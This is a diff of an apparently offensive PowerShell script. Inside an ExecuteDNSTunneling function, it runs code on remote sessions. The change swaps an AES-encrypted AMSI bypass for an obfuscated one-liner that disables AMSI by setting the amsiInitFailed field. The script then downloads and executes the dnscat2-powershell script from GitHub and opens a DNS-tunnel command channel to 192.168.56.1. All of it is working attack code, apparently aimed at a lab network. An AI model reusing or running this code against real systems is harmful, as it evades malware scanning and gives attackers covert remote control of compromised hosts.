@@ -138,43 +138,7 @@ function ExecuteDNSTunneling {
     foreach ($session in $sessions) {
         try {
             $job = Invoke-Command -Session $session -ScriptBlock {
-                function BypassSecurity {
-                    function Decrypt-StringAES128 {
-                        param (
-                            [Parameter(Mandatory = $true)]
-                            [string]$EncryptedText,
-                            [Parameter(Mandatory = $true)]
-                            [string]$Key,
-                            [Parameter(Mandatory = $true)]
-                            [string]$InitializationVector
-                        )
-                        $utf8 = New-Object System.Text.UTF8Encoding
-                        $cipherBytes = [Convert]::FromBase64String($EncryptedText)
-                        $aes = New-Object System.Security.Cryptography.AesManaged
-                        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
-                        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
-                        $aes.KeySize = 128
-                        $aes.BlockSize = 128
-                        $keyBytes = $utf8.GetBytes($Key)
-                        $aes.Key = $keyBytes
-                        $ivBytes = $utf8.GetBytes($InitializationVector)
-                        $aes.IV = $ivBytes
-                        $transform = $aes.CreateDecryptor()
-                        $plainBytes = $transform.TransformFinalBlock($cipherBytes, 0, $cipherBytes.Length)
-                        $plainText = $utf8.GetString($plainBytes)
-                        return $plainText
-                    }
-                    $key = "8877665544332211"
-                    $iv = "8877665544332211"
-                    $encryptedString1 = 'eeXBIbiNaN9nfQCwBjgoAg=='
-                    $encryptedString2 = 'Y8DlAQ7pm3Lx9to6/l/M+g=='
-                    $repalcement1 = $null
-                    $repalcement2 = $true
-                    $decryptedString1 = Decrypt-StringAES128 -EncryptedText $encryptedString1 -Key $key -InitializationVector $iv
-                    $decryptedString2 = Decrypt-StringAES128 -EncryptedText $encryptedString2 -Key $key -InitializationVector $iv
-                    [Ref].Assembly.GetType('System.Management.Automation.' + $decryptedString1).GetField($decryptedString2, 'NonPublic,Static').SetValue($repalcement1, $repalcement2)
-                }
-                BypassSecurity
+                $a = 'si'; $b = 'Am'; $Ref = [Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils' -f $b, $a)); $z = $Ref.GetField(('am{0}InitFailed' -f $a),'NonPublic,Static'); $z.("Set" + "Value")($null,$true)
                 Invoke-Expression (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1')
                 Start-Dnscat2 -Domain "test" -DNSServer 192.168.56.1
             } -AsJob
